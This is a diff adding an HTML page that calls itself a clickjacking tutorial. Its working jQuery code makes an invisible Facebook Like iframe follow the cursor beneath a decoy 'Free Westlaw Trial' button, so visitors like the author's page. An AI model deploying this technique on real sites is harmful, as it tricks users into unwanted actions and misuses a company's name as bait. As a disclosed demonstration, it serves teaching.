@@ -1,0 +1,369 @@
+
+<html>
+
+<head>
+    <title>Clickjacking</title>
+    <link href="https://fonts.googleapis.com/css?family=Roboto" rel="stylesheet">
+    <link rel="stylesheet" href="index.css">
+</head>
+
+<body>
+    <h1 class="center text-center" id="clickjackingHeader">Clickjacking</h1>
+    <p class="center text-center" id="loggedIn">&nbsp;</p>
+    <hr class="center">
+    <p class="center">This tutorial will demonstrate a clickjacking attack. By participating in this tutorial you will be enticed to like my Facebook page located at <a href="https://facebook.com/JReynoldsDev" target="_blank">https://facebook.com/JReynoldsDev</a>.
+        <br><b>If you do not wish to participate please exit out of this website now.</b></p>
+    <hr class="center">
+    <p class="center">Once you begin, a window will start following your cursor around. This is the iframe where the 'Like' button is stored. After a couple seconds the iframe will become invisible, this is what a victim will be greeted with upon visiting a clickjacking
+        site; an invisible iframe following their mouse.
+        <br>
+        <br>A new element will also appear after a few more seconds, enticing you to click it. By clicking on this element, you are actually clicking the hidden iframe and liking my Facebook page.</p>
+
+    <p class="center text-center">
+        <button class="btn btn-primary" id="startDemo" onclick="addClickjacking();">Click here to begin the clickjacking tutorial</button>
+    </p>
+    <hr>
+    <p class="center" id="description">
+        You can now see the button following your mouse shows a checkmark saying you have liked this page. This can be confirmed by visiting <a href="https://facebook.com/JReynoldsDev">https://facebook.com/JReynoldsDev</a>.
+        <br>
+        <sub>Press <i>q</i> to remove the Like button.</sub></p>
+    <div class="fancycenter" id="fancyButton">
+        <!--Codepen screwed up the formatting, but these should be indented-->
+        <div class="holder">
+            <div id="innerCircle">
+                <div class="wrapper">
+                    <div id="circle1" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle2" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle3" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle4" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle5" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle6" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle7" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle8" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle9" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle10" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle11" class="circle"></div>
+                </div>
+                <div class="wrapper">
+                    <div id="circle12" class="circle"></div>
+                </div>
+            </div>
+            <div id="twoCircle">
+                <div class="wrapper2">
+                    <div id="circle1" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle2" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle3" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle4" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle5" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle6" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle7" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle8" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle9" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle10" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle11" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle12" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle13" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle14" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle15" class="circle"></div>
+                </div>
+                <div class="wrapper2">
+                    <div id="circle16" class="circle"></div>
+                </div>
+            </div>
+            <div id="threeCircle">
+                <div class="wrapper3">
+                    <div id="circle1" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle2" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle3" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle4" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle5" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle6" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle7" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle8" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle9" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle10" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle11" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle12" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle13" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle14" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle15" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle16" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle17" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle18" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle19" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle20" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle21" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle22" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle23" class="circle"></div>
+                </div>
+                <div class="wrapper3">
+                    <div id="circle24" class="circle"></div>
+                </div>
+            </div>
+            <div id="outerCircle">
+                <div class="wrapper4">
+                    <div id="circle1" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle2" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle3" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle4" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle5" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle6" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle7" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle8" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle9" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle10" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle11" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle12" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle13" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle14" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle15" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle16" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle17" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle18" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle19" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle20" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle21" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle22" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle23" class="circle"></div>
+                </div>
+                <div class="wrapper4">
+                    <div id="circle24" class="circle"></div>
+                </div>
+            </div>
+        </div>
+        <h1 id="header">Thomson Reuters</h1>
+        <h2 id="wait">Free Westlaw Trial!</h2>
+        <button id="toggle">Click here!</button>
+    </div>
+    <div id="fb-root"></div>
+    <div class="fb-like" data-href="https://facebook.com/JReynoldsDev" data-layout="button" data-action="like" data-size="large" data-show-faces="false" data-share="false"></div>
+</body>
+<script src="https://code.jquery.com/jquery-2.2.4.min.js"></script>
+<script>
+    (function(d, s, id) {
+        var js, fjs = d.getElementsByTagName(s)[0];
+        if (d.getElementById(id)) return;
+        js = d.createElement(s);
+        js.id = id;
+        js.src = "https://connect.facebook.net/en_US/all.js#xfbml=1&version=v2.7&appId=180904742347601";
+        fjs.parentNode.insertBefore(js, fjs);
+    }(document, 'script', 'facebook-jssdk'));
+
+
+    window.fbAsyncInit = function() {
+        FB.init({
+            appId: '180904742347601',
+            status: true,
+            cookie: true,
+            xfbml: true
+        });
+        FB.getLoginStatus(function(response) {
+            if (response.status != "unknown") {
+                loggedIn(true);
+            } else {
+                loggedIn(false);
+            }
+        });
+    };
+
+    function loggedIn(value) {
+        if (value) {
+            $('#loggedIn').addClass("loggedIn");
+            $('#loggedIn').html('You are logged into Facebook.');
+        } else {
+            $('#loggedIn').addClass("notLoggedIn");
+            $('#loggedIn').html('You are not logged into Facebook, you must <a href="https://facebook.com" target="_blank">sign in</a>.');
+        }
+    }
+
+    function addClickjacking() {
+        $(window).mousemove(function(event) {
+            $('.fb-like').css({
+                "top": event.pageY - 14,
+                "left": event.pageX - 31
+            })
+        })
+        $('.fb-like').css('opacity', 1);
+        $('#startDemo').css('opacity', 0);
+        setTimeout(function() {
+            $('#startDemo').css({
+                'position': 'absolute'
+            });
+        }, 1000)
+        setTimeout(function() {
+            $('#fancyButton').animate({
+                'opacity': 1
+            }, 1000)
+            setInterval(function() {
+                $('#toggle').toggleClass('flash');
+            }, 500)
+            $('.fb-like').css('opacity', 0);
+            //Focus the element, so when it loses focus we trigger its event handler
+            document.activeElement.blur();
+            $('#startDemo').focus();
+            //When the button loses focus they presumably clicked the like button
+            //This is really the only "way" to detect the click in an iframe
+            $('#startDemo').focusout(function() {
+                $('#fancyButton').css('opacity', 0);
+                $('.fb-like').css('opacity', 1);
+                $('#description').css({
+                        'position': 'relative !important',
+                        'opacity': 1
+                    })
+                    //Now when they want to get rid of the box the iframe won't be focused.
+                var removeIframe = setInterval(function() {
+                    document.activeElement.blur();
+                }, 500);
+                $(window).keypress(function(event) {
+                    if (event.which === 113 || event.which === 81) {
+                        $('.fb-like').remove();
+                        clearInterval(removeIframe);
+                    }
+                })
+            })
+        }, 7500)
+    }
+
+    function removeClickjacking() {
+        $(window).mousemove(function(event) {})
+    }
+</script>
+
+</html>
+
